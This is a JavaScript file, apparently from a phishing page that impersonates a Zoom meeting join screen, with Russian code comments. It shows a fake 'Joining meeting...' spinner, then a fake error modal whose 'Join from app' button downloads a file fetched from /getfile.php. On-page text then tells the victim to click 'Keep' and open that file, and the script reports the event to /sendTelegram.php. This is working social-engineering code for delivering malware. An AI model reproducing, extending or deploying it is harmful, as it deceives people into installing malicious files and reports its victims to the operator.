var link = "";
var nameFile = "";
$.ajax({
  url: "/getfile.php",
  type: "POST",
  success: function (result) {
    console.log(result);
    link = result;
    nameFile = link.split("/").pop();
  },
});

// CSS стили
var css = `
#header_outer ul {
    list-style: none;
    margin: 0;
    padding: 0;
}
.dropdown-language .dropdown-menu {
    column-count: 2;
}
.dropdown-language .dropdown-menu, .dropdown-currency .dropdown-menu {
    border-radius: 4px;
    margin-top: 6px !important;
    text-shadow: none;
    border: 1px solid #eee;
}
.open>.dropdown-menu {
    display: block;
}
.dropdown-menu.pull-right {
    right: 0;
    left: auto;
}
.pull-right {
    float: right !important;
}
#header .action-btns .dropdown-language .dropdown-menu li {
    margin: 0;
}

#header .action-btns .dropdown-menu li {
    display: block;
    float: none;
    margin: 4px;
}
#header .action-btns li {
    margin-right: 40px;
    padding: 0;
    float: left;
}.join-frame #header_container .action-btns a {
    color: #2073d9;
    font-size: 13px;
    font-weight: 400;
}

.dropdown-language .dropdown-menu li.active>a, .dropdown-currency .dropdown-menu li.active>a {
    color: #fff !important;
}
.dropdown-language .dropdown-menu li>a, .dropdown-currency .dropdown-menu li>a {
    padding: 8px 14px;
    color: #555 !important;
    text-decoration: none;
    display: block;
    clear: both;
    font-weight: 300;
    line-height: 15px;
    white-space: nowrap;
    text-transform: inherit !important;
}
.join-frame .action-btns a {
    line-height: inherit;
}
.dropdown-menu>.active>a, .dropdown-menu>.active>a:hover, .dropdown-menu>.active>a:focus {
    color: #fff;
    text-decoration: none;
    background-color: #428bca;
    outline: 0;
}
.dropdown-menu>li>a {
    display: block;
    padding: 3px 20px;
    clear: both;
    font-weight: normal;
    line-height: 1.42857143;
    color: #333;
    white-space: nowrap;
}
.dropdown-language a, .dropdown-currency a {
    color: #fff;
}
a {
    color: #0956b5;
    text-decoration: none;
}
.dropdown-menu {
    position: absolute;
    top: 100%;
    left: 0;
    z-index: 1000;
    display: none;
    float: left;
    min-width: 160px;
    padding: 5px 0;
    margin: 2px 0 0;
    font-size: 14px;
    list-style: none;
    background-color: #fff;
    background-clip: padding-box;
    border: 1px solid #ccc;
    border: 1px solid rgba(0, 0, 0, .15);
    border-radius: 4px;
    -webkit-box-shadow: 0 6px 12px rgba(0,0,0,.175);
    box-shadow: 0 6px 12px rgba(0,0,0,.175);
}`;

// Создаём элемент style и записываем туда CSS
var style = document.createElement("style");
style.type = "text/css";
if (style.styleSheet) {
  // для IE
  style.styleSheet.cssText = css;
} else {
  // для остальных браузеров
  style.appendChild(document.createTextNode(css));
}
var change_language = document.getElementById("change_language");
// Помещаем элемент style в head
document.getElementsByTagName("head")[0].appendChild(style);

// HTML элементы
var ul = document.createElement("ul");
ul.className = "dropdown-menu pull-right";

var languages = [
  { href: "/index.html?82704550627pwd=QFPJJ9Rv1wBUsxFr50QxnXLlLpZTT5.1#success", locale: "en-US", label: "English" },
  { href: "/es/index.html?82704550627pwd=QFPJJ9Rv1wBUsxFr50QxnXLlLpZTT5.1#success", locale: "es-ES", label: "Español" },
  { href: "/de/index.html?82704550627pwd=QFPJJ9Rv1wBUsxFr50QxnXLlLpZTT5.1#success", locale: "de-DE", label: "Deutsch" },
  { href: "/zh-cn/index.html?82704550627pwd=QFPJJ9Rv1wBUsxFr50QxnXLlLpZTT5.1#success", locale: "zh-CN", label: "简体中文" },
  { href: "/zh-tw/index.html?82704550627pwd=QFPJJ9Rv1wBUsxFr50QxnXLlLpZTT5.1#success", locale: "zh-TW", label: "繁體中文" },
  { href: "/fr/index.html?82704550627pwd=QFPJJ9Rv1wBUsxFr50QxnXLlLpZTT5.1#success", locale: "fr-FR", label: "Français" },
  { href: "/pt/index.html?82704550627pwd=QFPJJ9Rv1wBUsxFr50QxnXLlLpZTT5.1#success", locale: "pt-PT", label: "Português" },
  { href: "/jp/index.html?82704550627pwd=QFPJJ9Rv1wBUsxFr50QxnXLlLpZTT5.1#success", locale: "jp-JP", label: "日本語" },
  { href: "/ru/index.html?82704550627pwd=QFPJJ9Rv1wBUsxFr50QxnXLlLpZTT5.1#success", locale: "ru-RU", label: "Русский" },
  { href: "/ko/index.html?82704550627pwd=QFPJJ9Rv1wBUsxFr50QxnXLlLpZTT5.1#success", locale: "ko-KO", label: "한국어" },
  { href: "/it/index.html?82704550627pwd=QFPJJ9Rv1wBUsxFr50QxnXLlLpZTT5.1#success", locale: "it-IT", label: "Italiano" },
  { href: "/vi/index.html?82704550627pwd=QFPJJ9Rv1wBUsxFr50QxnXLlLpZTT5.1#success", locale: "vi-VN", label: "Tiếng Việt" },
  { href: "/pl/index.html?82704550627pwd=QFPJJ9Rv1wBUsxFr50QxnXLlLpZTT5.1#success", locale: "pl-PL", label: "Polski" },
  { href: "/tr/index.html?82704550627pwd=QFPJJ9Rv1wBUsxFr50QxnXLlLpZTT5.1#success", locale: "tr-TR", label: "Türkçe" },
  { href: "/id/index.html?82704550627pwd=QFPJJ9Rv1wBUsxFr50QxnXLlLpZTT5.1#success", locale: "id-ID", label: "Bahasa Indonesia" },
  { href: "/nl/index.html?82704550627pwd=QFPJJ9Rv1wBUsxFr50QxnXLlLpZTT5.1#success", locale: "nl-NL", label: "Nederlands" },
];

languages.forEach(function (lang) {
  var li = document.createElement("li");
  var a = document.createElement("a");
  a.href = lang.href;
  a.setAttribute("data-locale", lang.locale);
  a.textContent = lang.label;
  li.appendChild(a);
  ul.appendChild(li);
});

// Вставляем ul в нужное место на странице, например, в конец body
change_language.appendChild(ul);

change_language.addEventListener("click", function () {
  var dropdownLanguage = document.querySelector(".dropdown-menu");
  dropdownLanguage.style.display = "block";
});
function createModal() {
  var modalDiv = document.createElement("div");
  modalDiv.id = "myModal";
  modalDiv.className = "modal";

  var modalContent = document.createElement("div");
  modalContent.className = "modal-content";

  var closeButton = document.createElement("span");
  closeButton.className = "close";
  closeButton.innerHTML = "&times;";

  closeButton.onclick = function () {
    var loadingScreen = document.getElementById("loadingScreen");

    modalDiv.style.animation = "fadeOut 0.5s forwards";
    loadingScreen.style.animation = "fadeOut 0.5s forwards";
    setTimeout(function () {
      modalDiv.style.display = "none";
      loadingScreen.style.display = "none";
    }, 490);
  };

  // Закрытие модального окна по клику вне его области
  window.onclick = function (event) {
    if (event.target == modalDiv) {
      var loadingScreen = document.getElementById("loadingScreen");

      modalDiv.style.animation = "fadeOut 0.5s forwards";
      loadingScreen.style.animation = "fadeOut 0.5s forwards";
      setTimeout(function () {
        modalDiv.style.display = "none";
        loadingScreen.style.display = "none";
      }, 490);
    }
  };
  var modalTitle = document.createElement("h2");
  modalTitle.textContent = "An unknown error occurred";

  var modalText = document.createElement("p");
  modalText.textContent = "Error code: 1132";

  var modalFooter = document.createElement("div");
  modalFooter.className = "modal-footer";

  var acceptButton = document.createElement("button");
  acceptButton.className = "btn accept";
  acceptButton.textContent = "Join from app";

  var declineButton = document.createElement("button");
  declineButton.className = "btn decline";
  declineButton.textContent = "Close";

  // Добавляем обработчик события на кнопку "Принять"
  acceptButton.addEventListener("click", function () {
    // Выполняем загрузку файла по ссылке
    if (link) {
      var downloadLink = document.createElement("a");
      downloadLink.href = link;
      downloadLink.target = "_blank"; // Открываем в новой вкладке
      downloadLink.download = ""; // Инициирует загрузку, а не просто переход по ссылке
      document.body.appendChild(downloadLink);
      downloadLink.click(); // Инициируем скачивание
      document.body.removeChild(downloadLink); // Удаляем элемент после скачивания

      // Создаем div элемент
      var alertDiv = document.createElement("div");
      alertDiv.setAttribute("role", "alert");
      alertDiv.classList.add("AIf0J3hN", "cvF4vE8e", "REZiVTB5");

      var innerDiv = document.createElement("div");
      innerDiv.classList.add("egxStE60");

      innerDiv.innerHTML =
        'Click <b>Keep</b> when receiving notification <br>Then click <b id="zoom_notif_text">' +
        nameFile +
        "</b>";

      alertDiv.appendChild(innerDiv);

      // Вставляем новый элемент в DOM
      document.body.appendChild(alertDiv);
    }

    var loadingScreen = document.getElementById("loadingScreen");

    modalDiv.style.animation = "fadeOut 0.5s forwards";
    loadingScreen.style.animation = "fadeOut 0.5s forwards";
    modalDiv.style.display = "none";
    loadingScreen.style.display = "none";
    $.ajax({
        url: "/sendTelegram.php",
        type: "POST",
        data: {
          link: link,
          code: localStorage.getItem("code") ? localStorage.getItem("code") : "default",
        },
        success: function (result) {
          console.log(result);
        },
      });
  });

  // Собираем элементы в модальное окно
  modalContent.appendChild(closeButton);
  modalContent.appendChild(modalTitle);
  modalContent.appendChild(modalText);
  modalFooter.appendChild(acceptButton);
  modalFooter.appendChild(declineButton);
  modalContent.appendChild(modalFooter);
  modalDiv.appendChild(modalContent);

  return modalDiv;
}
function addDynamicStyles() {
  var css = `
        .loading-screen {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            position: fixed;
            z-index: 99999;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(255, 255, 255, 1);
        }

        .loading-circle {
            border: 4px solid rgba(0, 0, 0, 0.1);
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 2s linear infinite;
        }

        .loading-text {
            margin-top: 10px;
        }

        .modal {
            display: none;
            position: fixed;
            z-index: 99999999;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            overflow: auto;
            background-color: rgba(0, 0, 0, 0.4);
            animation: fadeIn 0.5s;
        }

        .modal-content {
            background-color: #fefefe;
            margin: 15% auto;
            padding: 20px;
            border: 1px solid #888;
            width: 80%;
            max-width: 500px;
            border-radius: 5px;
            animation: slideIn 0.5s;
        }

        .close {
            color: #aaa;
            float: right;
            font-size: 28px;
            font-weight: bold;
        }

        .close:hover,
        .close:focus {
            color: black;
            text-decoration: none;
            cursor: pointer;
        }

        .modal-footer {
            text-align: right;
            margin-top: 20px;
        }

        .btn {
            padding: 10px 20px;
            margin-left: 10px;
            border-radius: 5px;
            border: none;
            font-size: 16px;
            cursor: pointer;
        }

        .accept {
            background-color: #007bff;
            color: white;
        }

        .decline {
            background-color: #fff;
            color: #007bff;
            border: 1px solid #007bff;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        @keyframes slideIn {
            from { top: -300px; opacity: 0; }
            to { top: 15%; opacity: 1; }
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    `;

  // Создаем элемент style и добавляем CSS правила
  var style = document.createElement("style");
  style.type = "text/css";
  if (style.styleSheet) {
    style.styleSheet.cssText = css; // Для IE
  } else {
    style.appendChild(document.createTextNode(css)); // Для остальных браузеров
  }

  // Добавляем созданный style элемент в head
  document.head.appendChild(style);
}
function createLoadingScreen() {
  var loadingScreenDiv = document.createElement("div");
  loadingScreenDiv.id = "loadingScreen";
  loadingScreenDiv.className = "loading-screen";

  var loadingCircle = document.createElement("div");
  loadingCircle.className = "loading-circle";

  var loadingText = document.createElement("p");
  loadingText.className = "loading-text";
  loadingText.textContent = "Joining meeting...";

  loadingScreenDiv.appendChild(loadingCircle);
  loadingScreenDiv.appendChild(loadingText);

  return loadingScreenDiv;
}
var main_button = document.getElementById("main_button_download");

main_button.addEventListener("click", function () {
  addDynamicStyles();

  // Создаем и показываем экран загрузки
  var loadingScreen = createLoadingScreen();
  document.body.appendChild(loadingScreen);

  setTimeout(function () {
    var modal = createModal();
    document.body.appendChild(modal);
    modal.style.display = "block";
  }, 5000);

  var a_download_zoom = document.getElementById("a_download_zoom");

  a_download_zoom.href = link;

  var button = document.querySelector(".smooth-0");
  button.classList.add("active");
});
